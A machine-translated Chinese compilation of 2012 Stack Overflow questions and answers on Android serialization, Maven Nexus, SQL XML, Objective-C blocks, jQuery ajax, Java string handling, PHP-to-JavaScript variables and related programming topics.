为了将数据保存在内存中，我使用了应用程序对象。不幸的是，当应用程序被杀死时，应用程序对象实例似乎被破坏了。

因此，我想知道在 onPause() 期间将我的自定义对象（包含在应用程序对象中）序列化并保存在内部存储中是否是一种好习惯。显然，我会先从 onResume() 中的文件读取，然后再从 Internet 重新加载。这个想法也是为了启用离线查看。

从长远来看，计划是在后台服务中移动下载日期的代码。由于在 Android 中保持应用程序状态似乎有很多不同的方法，我想确定这是正确的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:54:23.970

尝试使用这些方法类来保存您需要的对象（实现序列化）：

```
public synchronized boolean save(String fileName, Object objToSave)
    {
        try
        {

            // save to file
            File file = new File(CONTEXT.getDir("filesdir", Context.MODE_PRIVATE) + "/file.file");
            if (file.exists())
            {
                file.delete();
            }

            file.getParentFile().mkdirs();
            file.createNewFile();

            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file));
            oos.writeObject(objToSave);
            oos.close();

            return true;
        }
        catch (FileNotFoundException e)
        {
            e.printStackTrace();
            return false;
        }
        catch (IOException e)
        {
            e.printStackTrace();
            return false;
        }
    }

public synchronized Object load(String fileName)
    {
        try
        {

            File file = new File(CONTEXT.getDir("filesdir", Context.MODE_PRIVATE) + "/file.file");
            if (!file.exists())
            {
                return null;
            }

            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file));
            savedObj = ois.readObject();
            ois.close();

            return savedObj;
        }
        catch (FileNotFoundException e)
        {
            e.printStackTrace();
            return null;
        }
        catch (Exception e)
        {
            e.printStackTrace();
            return null;
        }
    } 
```

您需要转换您加载的对象（）。CONTEXT 是一个 Activity 或 ApplicationContext 来访问缓存目录。您可以使用 Environment.getExternalStorageState() 来获取目录路径。不要忘记添加它“/文件名”。

# java - 尝试设置 Maven Nexus 服务器但得到“无法解决依赖关系”

> ID：12587464
> 
> 赞同：1
> 
> 时间：2012-09-25T16:45:36.307
> 
> 标签：java, maven, spring-webflow, nexus

尝试设置 Maven Nexus 服务器，但仅在某些包上获得“无法解决依赖关系”。

这是我的**mvn 包的输出**

```
[INFO] ------------------------------------------------------------------------
[INFO] Building School Visit 1.0.0-BUILD-SNAPSHOT
[INFO] ------------------------------------------------------------------------
[WARNING] The POM for org.springframework.webflow:spring-faces:jar:2.3.1.BUILD-SNAPSHOT is missing, no dependency information available
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 4.414s
[INFO] Finished at: Tue Sep 25 12:42:45 EDT 2012
[INFO] Final Memory: 6M/100M
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal on project SchoolVisit: Could not resolve dependencies for project org.uftwf.schoolvisit:SchoolVisit:war:1.0.0-BUILD-SNAPSHOT: Failure to find org.springframework.webflow:spring-faces:jar:2.3.1.BUILD-SNAPSHOT in http://localhost:8080/nexus/content/groups/public was cached in the local repository, resolution will not be reattempted until the update interval of nexus has elapsed or updates are forced -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/DependencyResolutionException 
```

这是我的 settings.xml 文件：

```
<settings>
  <mirrors>
    <mirror>
      <!--This sends everything else to /public -->
      <id>nexus</id>
      <mirrorOf>*</mirrorOf>
      <url>http://localhost:8080/nexus/content/groups/public</url>
    </mirror>
  </mirrors>
  <profiles>
    <profile>
        <id>nexus</id>
        <activation>
            <activeByDefault>true</activeByDefault>
        </activation>
        <repositories>
            <repository>
                <id>release</id>
                <url>http://127.0.0.1:8080/nexus-2.1.2/content/groups/public</url>
                <releases>
                    <enabled>true</enabled>
                </releases>
                <snapshots>
                    <enabled>false</enabled>
                </snapshots>
            </repository>
            <repository>
                <id>snapshots</id>
                <url>http://127.0.0.1:8080/nexus-2.1.2/content/groups/public-snapshots</url>
                <releases>
                    <enabled>false</enabled>
                </releases>
                <snapshots>
                    <enabled>true</enabled>
                </snapshots>
            </repository>
        </repositories>
    </profile>
</profiles>

  <activeProfiles>
    <!--make the profile active all the time -->
    <activeProfile>nexus</activeProfile>
  </activeProfiles>
</settings> 
```

这是我的 pom.xml 文件

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>org.uftwf.schoolvisit</groupId>
    <artifactId>SchoolVisit</artifactId>
    <name>School Visit</name>
    <packaging>war</packaging>
    <version>1.0.0-BUILD-SNAPSHOT</version>

    <properties>
        <java-version>1.5</java-version>
        <springframework-version>3.1.2.RELEASE</springframework-version>
        <springwebflow-version>2.3.1.BUILD-SNAPSHOT</springwebflow-version>
        <springsecurity-version>3.1.2.RELEASE</springsecurity-version>
        <org.slf4j-version>1.6.6</org.slf4j-version>
        <hibernate.version>4.1.1.Final</hibernate.version>
    </properties>

    <dependencies>
        <!-- Spring -->

        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-orm</artifactId>
            <version>${springframework-version}</version>
            <!-- will come with all needed Spring dependencies such as spring-core 
                and spring-beans -->
        </dependency>

        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-aspects</artifactId>
            <version>${springframework-version}</version>
        </dependency>

        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>${springframework-version}</version>
            <exclusions>
                <exclusion>
                    <groupId>commons-logging</groupId>
                    <artifactId>commons-logging</artifactId>
                </exclusion>
            </exclusions>
        </dependency>

        <dependency>
            <groupId>org.springframework.webflow</groupId>
            <artifactId>spring-faces</artifactId>
            <version>${springwebflow-version}</version>
        </dependency>

        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>${springsecurity-version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-config</artifactId>
            <version>${springsecurity-version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-web</artifactId>
            <version>${springsecurity-version}</version>
        </dependency>

        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-ldap</artifactId>
            <version>${springsecurity-version}</version>
        </dependency>

        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-cas</artifactId>
            <version>${springsecurity-version}</version>
        </dependency>

        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-cas-client</artifactId>
            <version>3.0.7.RELEASE</version>
            <exclusions>
                <exclusion>
                    <artifactId>cas-client-core</artifactId>
                    <groupId>org.jasig.cas</groupId>
                </exclusion>
            </exclusions>
        </dependency>

        <dependency>
            <groupId>javax.transaction</groupId>
            <artifactId>jta</artifactId>
            <version>1.1</version>
        </dependency>

        <dependency>
            <groupId>javax.mail</groupId>
            <artifactId>mail</artifactId>
            <version>1.4.5</version>
        </dependency>

        <dependency>
            <groupId>cglib</groupId>
            <artifactId>cglib</artifactId>
            <version>2.2.2</version>
        </dependency>

        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>5.1.21</version>
        </dependency>

        <dependency>
            <groupId>c3p0</groupId>
            <artifactId>c3p0</artifactId>
            <version>0.9.1.2</version>
        </dependency>

        <dependency>
            <groupId>org.apache.httpcomponents</groupId>
            <artifactId>httpcore</artifactId>
            <version>4.2.1</version>
        </dependency>

        <dependency>
            <groupId>org.apache.httpcomponents</groupId>
            <artifactId>httpclient</artifactId>
            <version>4.2.1</version>
            <exclusions>
                <exclusion>
                    <artifactId>commons-logging</artifactId>
                    <groupId>commons-logging</groupId>
                </exclusion>
            </exclusions>
        </dependency>

        <dependency>
            <groupId>org.aspectj</groupId>
            <artifactId>aspectjtools</artifactId>
            <version>1.6.2</version>
        </dependency>

        <dependency>
            <groupId>jstl</groupId>
            <artifactId>jstl</artifactId>
            <version>1.2</version>
        </dependency>

        <!-- Logging -->

        <dependency>
            <groupId>org.slf4j</groupId>
            <artifactId>slf4j-ext</artifactId>
            <version>${org.slf4j-version}</version>
        </dependency>

        <dependency>
            <groupId>org.slf4j</groupId>
            <artifactId>slf4j-log4j12</artifactId>
            <version>${org.slf4j-version}</version>
        </dependency>

        <dependency>
            <groupId>org.slf4j</groupId>
            <artifactId>slf4j-api</artifactId>
            <version>${org.slf4j-version}</version>
        </dependency>
        <dependency>
            <groupId>org.slf4j</groupId>
            <artifactId>jcl-over-slf4j</artifactId>
            <version>${org.slf4j-version}</version>
        </dependency>
        <dependency>
            <groupId>log4j</groupId>
            <artifactId>log4j</artifactId>
            <version>1.2.16</version>

        </dependency>
        <!-- JSF-303 Dependency Injection -->
        <dependency>
            <groupId>javax.inject</groupId>
            <artifactId>javax.inject</artifactId>
            <version>1</version>
        </dependency>
        <!-- Servlet -->
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>servlet-api</artifactId>
            <version>2.5</version>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>javax.servlet.jsp</groupId>
            <artifactId>jsp-api</artifactId>
            <version>2.1</version>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>jstl</artifactId>
            <version>1.2</version>
        </dependency>
        <!-- Sun Mojarra JSF 2 runtime -->
        <dependency>
            <groupId>com.sun.faces</groupId>
            <artifactId>jsf-api</artifactId>
            <version>2.1.7</version>
        </dependency>
        <dependency>
            <groupId>com.sun.faces</groupId>
            <artifactId>jsf-impl</artifactId>
            <version>2.1.7</version>
        </dependency>

        <!-- JSR 303 validation -->
        <dependency>
            <groupId>javax.validation</groupId>
            <artifactId>validation-api</artifactId>
            <version>1.0.0.GA</version>
        </dependency>

        <!-- ********************************************************************** 
            ** HIBERNATE DEPENDENCIES ** ********************************************************************** -->

        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-entitymanager</artifactId>
            <version>${hibernate.version}</version>
        </dependency>

        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-validator</artifactId>
            <version>4.0.2.GA</version>
        </dependency>

        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-validator</artifactId>
            <version>4.0.2.GA</version>
        </dependency>
        <!-- Test -->
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.7</version>
            <scope>test</scope>
        </dependency>
    </dependencies>

    <repositories>
        <!-- For testing against latest Spring snapshots -->
        <repository>
            <id>org.springframework.maven.snapshot</id>
            <name>Spring Maven Snapshot Repository</name>
            <url>http://maven.springframework.org/snapshot</url>
            <releases>
                <enabled>false</enabled>
            </releases>
            <snapshots>
                <enabled>true</enabled>
            </snapshots>
        </repository>
        <!-- For developing against latest Spring milestones -->
        <repository>
            <id>org.springframework.maven.milestone</id>
            <name>Spring Maven Milestone Repository</name>
            <url>http://maven.springframework.org/milestone</url>
            <snapshots>
                <enabled>false</enabled>
            </snapshots>
        </repository>
        <!-- For Hibernate Validator -->
        <repository>
            <id>org.jboss.repository.releases</id>
            <name>JBoss Maven Release Repository</name>
            <url>https://repository.jboss.org/nexus/content/repositories/releases</url>
            <snapshots>
                <enabled>false</enabled>
            </snapshots>
        </repository>
        <!-- For Sun Mojarra JSF 2 implementation -->
        <repository>
            <id>maven2-repository.dev.java.net</id>
            <name>Java.net Repository for Maven</name>
            <url>http://download.java.net/maven/2/</url>
            <snapshots>
                <enabled>false</enabled>
            </snapshots>
        </repository>
        <!-- For PrimeFaces JSF component library -->

    </repositories>

    <build>

    <plugins>
            <plugin>
                <groupId>org.codehaus.mojo</groupId>
                <artifactId>tomcat-maven-plugin</artifactId>
                <configuration>
                    <mode>both</mode>
                </configuration>
            </plugin>

            <plugin>
                <groupId>org.codehaus.mojo</groupId>
                <artifactId>tomcat-maven-plugin</artifactId>
                <configuration>
                    <server>6dvews01</server>
                </configuration>
            </plugin>

    </plugins>

        <finalName>SchoolVisit</finalName>
    </build>
</project> 
```

有人可以告诉我为什么会收到此错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:07:40.240

问题不在于您的项目或在您的 settings.xml 文件中。

Maven 将联系您的 localhost Nexus 存储库进行查找，`org.springframework.webflow:spring-faces:jar:2.3.1.BUILD-SNAPSHOT`但显然没有找到。

您的本地 Nexus 存储库中是否存在此工件？您是否在 Nexus 中设置了其他存储库，以便它去获取它没有的工件？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:26:05.383

也许你真的`2.3.1.RELEASE`不想`2.3.1.BUILD-SNAPSHOT`？

# sql - 如何计算 SQL XML 中节点的出现次数？

> ID：12587466
> 
> 赞同：16
> 
> 时间：2012-09-25T16:45:52.753
> 
> 标签：sql, xml, sql-server-2008

我正在尝试计算“颜色”节点的出现次数，但到目前为止还没有成功。

以下是我到目前为止所尝试的。

如果我有以下逻辑：

```
DECLARE @MyXML XML
SET @MyXML = '<SampleXML>
<Colors>
<Color1>White</Color1>
<Color2>Blue</Color2>
<Color3>Black</Color3>
<Color4 Special="Light">Green</Color4>
<Color5>Red</Color5>
</Colors>
<Fruits>
<Fruits1>Apple</Fruits1>
<Fruits2>Pineapple</Fruits2>
<Fruits3>Grapes</Fruits3>
<Fruits4>Melon</Fruits4>
</Fruits>
</SampleXML>'

SELECT
count(a.b.value('Colors','varchar(10)')) AS Color1
FROM @MyXML.nodes('SampleXML') a(b) 
```

我收到以下错误：

> 消息 2389，级别 16，状态 1，第 50 行
> XQuery [value()]：'value()' 需要单例（或空序列），找到类型为 'xdt:untypedAtomic *' 的操作数

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-09-25T16:57:59.130

这将计算颜色节点的数量，即`1`.

```
select @MyXML.value('count(/SampleXML/Colors)', 'int') 
```

`Colors`这将计算is的行数`5`。

```
select @MyXML.value('count(/SampleXML/Colors/*)', 'int') 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-25T16:51:40.253

```
select @MyXML.value('count(/SampleXML/Colors)', 'INT') AS 'Count' 
```

# objective-c - 遍历数组时的iOS块范围

> ID：12587467
> 
> 赞同：2
> 
> 时间：2012-09-25T16:45:53.953
> 
> 标签：objective-c, ios, ios5, objective-c-blocks

我试图遍历一个数组以计算一个值，由下面的代码建模：

```
double foo = 0;

[sortedKeys enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop){
  foo += (NSNumber*)[obj doSomething].doubleValue
}]; 
```

但是我收到一个错误，提示 foo 的范围不合适，我该如何设置 foo 以便块看到它并在它运行时对其进行修改。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T16:47:20.147

您应该添加`__block`到声明中，以便能够从块内*修改*变量：

```
__block double foo = 0; 
```

# facebook - 如何在 Facebook 页面上启用 share_item？

> ID：12587468
> 
> 赞同：0
> 
> 时间：2012-09-25T16:46:00.690
> 
> 标签：facebook, facebook-graph-api

我们有几个 FB 页面，需要在页面上发布项目。我们收到错误致命错误：未捕获的 OAuthException：（＃282）需要扩展权限：share_item。

当我第一次发布到我的个人 FB 页面时，我遇到了同样的错误。但是在我检查了[https://developers.facebook.com/tools/explorer中的“share_item”之后工作了](https://developers.facebook.com/tools/explorer)

问题是，**如何在我作为“经理”的其他 FB 页面上启用“share_item”？**FB 菜单中是否有我没有看到的页面，或者我如何将[https://developers.facebook.com/tools/explorer](https://developers.facebook.com/tools/explorer)与其他页面一起使用来启用它？

以下代码是在我的个人 FB 页面上启用“share_item”后起作用的，但问题是如何在我作为经理的 FB 页面上启用 share_item？

```
$fb = new Facebook(array(
     'appId'  => FB_APP_ID,
     'secret' => FB_SECRET,
));

$fb->api( '/' . FB_PAGE_ID . '/links', 'POST', array(
     'client_id' => FB_APP_ID,
     'access_token' => $fb->getAccessToken(),
     'link' => 'http://www.example.com',
     'message' => 'Some comments...'
)); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:40:15.847

再次阅读[权限](https://developers.facebook.com/docs/authentication/permissions/)文档 - 您的[身份验证](https://developers.facebook.com/docs/authentication/)流程不得向用户请求正确的权限。

请求`publish_stream`权限 - 这包括所有其他发布权限，如`share_item`,`status_update`等。如果这是您正在使用的页面访问令牌，它应该已经具有适当的权限

# ios - 如果我想强制横向，是否需要手动调整舞台的高度和宽度？

> ID：12587472
> 
> 赞同：1
> 
> 时间：2012-09-25T16:46:26.257
> 
> 标签：ios, actionscript-3, air

我只是在学习使用**Adob​​e AIR**为 iOS 编写代码。我对 ActionScript 3 很熟悉，虽然不是很有经验。

无论设备的方向如何，我都希望我的应用程序保持横向。我知道要为 iOS 设备设置方向，我必须设置`<autoOrients>false</autoOrients>`和`<aspectRatio>landscape</aspectRatio>`. 但是，由于我使用的是 Adob​​e Flash Professional，我想知道是否需要更改**舞台的高度和宽度**以反映实际应用程序中的这种变化。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:07:19.070

不，您不必这样做，一旦设置了这些设置，它将自动处理。当舞台处于横向模式时，stage.stageHeight 和 stage.stageWidth 应该报告正确的尺寸。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T06:14:45.203

Stage.width 和 Stage.height 是只读的。

要强制横向使用应用程序描述符 xml 定义，例如：

风景 真实

# macos - kIOHIDOptionsTypeSeizeDevice 导致设备无响应

> ID：12587477
> 
> 赞同：0
> 
> 时间：2012-09-25T16:46:48.627
> 
> 标签：macos, hid, iokit

我正在尝试编写一个简单的命令行程序，它将给定键盘上的击键发送到 UDP 服务器。我正在使用`IOKit`框架及其`IOHIDManager`类在 OSX 上编程。

就我的程序而言，我想`kIOHIDOptionsTypeSeizeDevice`在打开`IOHIDManager`实例并在回调设置中发送 UDP 消息时使用`IOHIDManagerRegisterInputValueCallback`.

当我通过该功能设置过滤`IOHIDManagerSetDeviceMatching`以匹配我的 MacBook Pro 的内部键盘时，一切正常：按键不再传递到焦点应用程序，并且事件通过 UDP 正确发送。

当我尝试匹配 USB 读卡器（[http://www.gitak.com/GIT-200USB.PDF](http://www.gitak.com/GIT-200USB.PDF)）时，一切正常，直到刷卡时设备发送的第一个事件。在第一个字符之后，不再调用注册的回调。

更准确地说：

*   设备匹配正确（即使多次拔出）
*   正确处理第一个接收到的字符
*   该设备有一个 LED 来指示它何时准备好进行新的滑动，通常在滑动后它会变回绿色，但在这种情况下，在发送第一个事件后，它会保持关闭
*   使用内部键盘时，一切都按预期工作`kIOHIDOptionsTypeSeizeDevice`
*   将读卡器与`kIOHIDOptionsTypeNone`而不是一起使用时，一切都按预期工作`kIOHIDOptionsTypeSeizeDevice`（即使事件仍传递给焦点应用程序）
*   在变得无响应后，拔下并重新插入设备会重复描述的行为
*   该程序以root权限运行

相对简单的程序可以在这里找到：

[https://gist.github.com/3783042](https://gist.github.com/3783042)

如何修改它以不导致读卡器在发送第一个事件后变得无响应？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-13T15:25:12.320

事实证明，这是设备有缺陷。我订购了一个新的，现在一切正常！

# ruby - 不是 gzip 格式 (Zlib::GzipFile::Error) - 在 Ruby 中解压缩 gzip 文件时

> ID：12587482
> 
> 赞同：3
> 
> 时间：2012-09-25T16:47:19.630
> 
> 标签：ruby, zlib

我正在尝试使用以下 Ruby 代码解压缩文件。

```
File.open("file_compressed.gz") do |compressed|
  File.open("file_decomp","w") do |decompressed|
    gz = Zlib::GzipReader.new(compressed)
    result = gz.read
    decompressed.write(result)
    gz.close
  end
end 
```

但我收到以下错误 -

```
 not in gzip format (Zlib::GzipFile::Error)
 ./features/support/abc/abc_file.rb:44:in `initialize' 
```

当我在 Mac 上使用 gzip 命令解压缩同一个文件时，它产生了正确的未压缩输出。对于以下命令，我可以看到 -

```
 $file file_compressed.gz
 file_compressed.gz: gzip compressed data, from FAT filesystem (MS-DOS, OS/2, NT) 
```

使用 Zlib 创建压缩文件时是否需要放置任何标头数据？因为当我使用 inflate 方法而不是 GzipReader 我得到以下错误 -

```
 incorrect header check (Zlib::DataError)
  ./features/support/abc/abc_file.rb:69:in `inflate' 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T19:20:14.433

如果您使用的平台不使用`LF`分隔符，而是使用`CR`+ `LF`，则可能需要以二进制模式打开文件以进行读取：

```
File.open("file_compressed.gz", "rb") do |compressed|
  # ...
end 
```

这也应该避免将输入流解释为 8 位二进制以外的任何内容。

确保以`"wb"`与标志相同的方式打开输出文件。

# sql - 如何从 SQL Server 中的数据库自动制作模型？

> ID：12587488
> 
> 赞同：-1
> 
> 时间：2012-09-25T16:47:26.473
> 
> 标签：sql, sql-server, database

我遵循数据库优先方法。请帮助我如何从我的数据库中制作模型。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:58:07.540

在sql server management studio中，可以展开[server] => Databases => [database_name]下的database节点，第一项应该是“database diagrams”。右键单击，点击 New Diagram，您将被带到一个对话框，您可以在其中将所需的表导入图表。

另一个选项是，如果您使用第三方数据建模工具，请转到 [database_name] => Tasks => Generate Scripts，然后生成数据库创建脚本。我使用的工具 ERWin 和 ER Studio 可以将这些脚本作为模型导入。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T20:07:08.470

ErWin 是一种通用工具，几乎是一种行业标准。您不必学习它，但很高兴知道。

他们的社区版是免费的，非常适合学习数据建模，从物理到逻辑（我猜你在这里尝试做的事情）和其他方式。

[http://erwin.com/downloads/](http://erwin.com/downloads/)

我会推荐鱼尾纹符号，它现在似乎是行业标准（比 SSMS 提供的无限键符号更好）。讨厌链接到维基百科，但下面的这篇文章是 A-OK：

[http://en.wikipedia.org/wiki/Entity-relationship_diagram#Crow.27s_Foot_Notation](http://en.wikipedia.org/wiki/Entity-relationship_diagram#Crow.27s_Foot_Notation)

# javascript - $.ajax vs $.post vs $.get vs $.load

> ID：12587497
> 
> 赞同：1
> 
> 时间：2012-09-25T16:47:45.850
> 
> 标签：javascript, ajax, jquery

> **可能重复：**
> [$.ajax() 和 $.get() 和 $.load() 之间的区别](https://stackoverflow.com/questions/3870086/difference-between-ajax-and-get-and-load)

我想要完成的是在不刷新页面的情况下更改页面中的数据。通过浏览 jQuery 的文档，我了解到我可以使用以下方法。但我不明白使用哪种方法。在我看来，它们都一样。

**$.ajax vs $.post vs $.get vs $.load 有什么区别？**

我阅读了文档，但无法正确理解上述方法的区别。我是 jQuery 的新手。如果有人可以解释差异，那将是一个很大的帮助。

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-25T16:49:29.053

他们言出必行。

*   $.ajax 是用于发送 XMLHttpRequests 的函数
*   $.post 是 $.ajax 的 POST 包装器
*   $.get 是 $.ajax 的 GET 包装器
*   $.load 是相同的概念，但允许您轻松地将内容加载到选定的元素中。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-25T16:48:57.327

$.post 和 $.get 只是使用具有指定类型的 $.ajax 的简写。这同样适用于负载。

[$("#id").load 和 $.ajax 之间的区别？](https://stackoverflow.com/questions/2076642/difference-between-id-load-and-ajax)

[http://api.jquery.com/jQuery.post/](http://api.jquery.com/jQuery.post/) - 它实际上指定它是第二段中的简写：

> 这是一个简写的 Ajax 函数，相当于：
> 
> `$.ajax({ type: 'POST', url: url, data: data, success: success,
> dataType: dataType });`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-25T16:50:25.273

[`post`](http://api.jquery.com/jQuery.post/), [`get`](http://api.jquery.com/jQuery.get/), 和[`load`](http://api.jquery.com/load/)都是该[`ajax`方法](http://api.jquery.com/jQuery.ajax/)的速记包装：

> $.ajax() 函数是 jQuery 发送的所有 Ajax 请求的基础。通常不需要直接调用这个函数，因为有几个更高级的替代方法，如 $.get() 和 .load() 可用并且更容易使用。但是，如果需要不太常用的选项，可以更灵活地使用 $.ajax()。

# java - MyRepresentation 引发异常后未调用 MyStatusService

> ID：12587499
> 
> 赞同：1
> 
> 时间：2012-09-25T16:47:49.083
> 
> 标签：java, restlet

我正在使用 Restlet 2.0.15 版

我正在实现一项服务，该服务会动态生成一个可能很大的 zip 文件，以供 ReST 客户端下载。在生成这个文件时，可能会发生错误，当它发生时，我想给客户端一个有意义的错误响应。

我的设置包括：

```
In the main, an instance of Application is constructed, and the Component.setStatusS​ervice(StatusService​) and
Application.setStatu​sSevice(StatusServic​e) are invoked with MyStatusService (Extends StatusService)
and, and MyStatusService overrides:

    public Representation getRepresentation(Status status, Request request, Response response) {

    public Status getStatus(Throwable throwable, Request request, Response response) {

    public Status getStatus(Throwable throwable, UniformResource resource) { 
```

...

```
When I handle the GET request from the client, I set the entity in the response
(Response.setEntity(​Representation) with MyRepresentation which extends OutputRepresentation.
The MyRepresentation class overrides the method:

   public void write(WritableByteChannel writableChannel)

which calls the overridden method:

   public void write(OutputStream outputStream)

which does the work of generating the zip file. 
```

当我运行它时，会发生以下情况：

ServerCall.sendRespo​nse(Response) 调用 -->

ServerCall.writeResp​onseBody(Representat​ion, WritableChannel, OutputStream) --> 调用

MyRepresentation(扩展 OutputRepresentation​).write(OutputStream​)

它发现了一个问题（如预期的那样）（出于测试原因故意不好）请求，并希望给客户端一个有意义的响应。所以它抛出一个异常（应该是 ResourceException，还是任何异常？），它被捕获在

```
ServerAdapter.commit​(HttpResponse) 
```

但是在这之后，没有调用 MyStatusService 中的任何方法，所以客户端没有得到有意义的消息，只有 500 状态。

有没有办法控制状态（最好是给客户一个信息性消息）？

感谢您提供任何信息，

*   吉姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-04T14:21:42.700

这实际上是 Restlet 中的一个错误。问题记录在：

[https://github.com/restlet/restlet-framework-java/issues/670](https://github.com/restlet/restlet-framework-java/issues/670)

# java - 解析字符串以删除空格java

> ID：12587502
> 
> 赞同：2
> 
> 时间：2012-09-25T16:48:12.137
> 
> 标签：java, parsing

我需要一些帮助来解析输入到稍后被清理和输出的字符串。

例如

```
String str = " tHis  strIng is  rEalLy mEssy  " 
```

我需要做的是让它看起来像这样：

```
"ThisStringIsReallyMessy" 
```

所以我基本上需要清理它，然后只将每个单词的第一个字母设置为大写，如果有人使用数字，它不会中断。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-25T16:55:40.770

Apache Commons 来救援（再次）。与往常一样，值得查看 Commons 库，不仅仅是针对这个特定问题，而是针对许多功能。

您可以使用 Apache Commons [WordUtils.capitalize()](http://commons.apache.org/lang/api-2.5/org/apache/commons/lang/WordUtils.html#capitalize%28java.lang.String%29)将字符串中的每个单词大写。然后 a`replaceAll(" ", "")`将把你的空格装箱。

```
String result = WordUtils.capitalize(str).replaceAll(" ", ""); 
```

注意（其他）Brian 在下面的评论。`replace()`vs背后的`replaceAll()`选择

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-25T16:58:19.260

```
String[] tokens = " tHis  strIng is  rEalLy mEssy  ".split(" ");
StringBuilder result = new StringBuilder();
for(String token : tokens) {
    if(!token.isEmpty()) {
        result.append(token.substring(0, 1).toUpperCase()).append(token.substring(1).toLowerCase());
     }
}
System.out.println(result.toString()); // ThisStringIsReallyMessy 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-25T16:49:18.637

```
 String str = " tHis  strIng is  rEalLy mEssy  ";
   str =str.replace(" ", "");
   System.out.println(str); 
```

输出：

```
tHisstrIngisrEalLymEssy 
```

对于每个单词的首字母大写，没有可用的内置函数，这个[线程](https://stackoverflow.com/questions/1892765/capitalize-first-char-of-each-word-in-a-string-java)有可能的解决方案。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T16:50:16.650

你是这个意思吗？

```
str = str.replaceAll(" ", ""); 
```

# php - 将计数器变量从 PHP 传输到 .JS 文件

> ID：12587507
> 
> 赞同：1
> 
> 时间：2012-09-25T16:48:45.450
> 
> 标签：php, javascript, jquery, json

我正在尝试将我在 PHP 脚本中创建的计数器变量传递给我的 .JS 文件。我在这里读到过，最好的方法是使用 JSON（我正在使用 JQuery 编写），但我很难让它与我所拥有的一起工作。

在我的 PHP 中，我将计数器应用于 td 类，然后通过 JSON 发送它。所以：

```
….
<table>
<?php $counter = 0;?>
<?php while ($counter < 20) : ?>
<tr>
...
<td class="classname<?php echo $counter; ?>"></td>
</tr>

<script type="text/javascript">
var counter = <?php echo json_encode($counter); ?>;
</script>

<?php $counter++;
endwhile; ?>
</table>
… 
```

现在在我的 .js 文件中，我有以下行试图将我回显的计数器放入 CSS 标识符中：

```
 if...
  $('td.classname' + counter).text("Text gets displayed");/* Change text in td */} 
```

这是访问变量的错误方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:51:19.717

不需要 JSON，因为您在服务器端执行此操作，只需删除`json_encode`并将`echo`其分配给 js 的值`counter`。

```
<script type="text/javascript">
var counter = <?php echo $counter; ?>;
</script> 
```

# security - 为什么不应该允许机器人使用会话 ID？

> ID：12587513
> 
> 赞同：1
> 
> 时间：2012-09-25T16:49:17.170
> 
> 标签：security, session, e-commerce, bots

我正在尝试编写一个脚本，让我能够识别试图淹没我的 oscommerce 网站的机器人，但是有些机器人经常更改它们的 IP，所以我不能真正使用 IP 来禁止它们。

我在想，如果我为机器人启用会话，我可以使用会话 ID 来阻止机器人。

我对此进行了一些研究，发现不建议为机器人启用会话，但我仍然不确定为什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T16:53:33.050

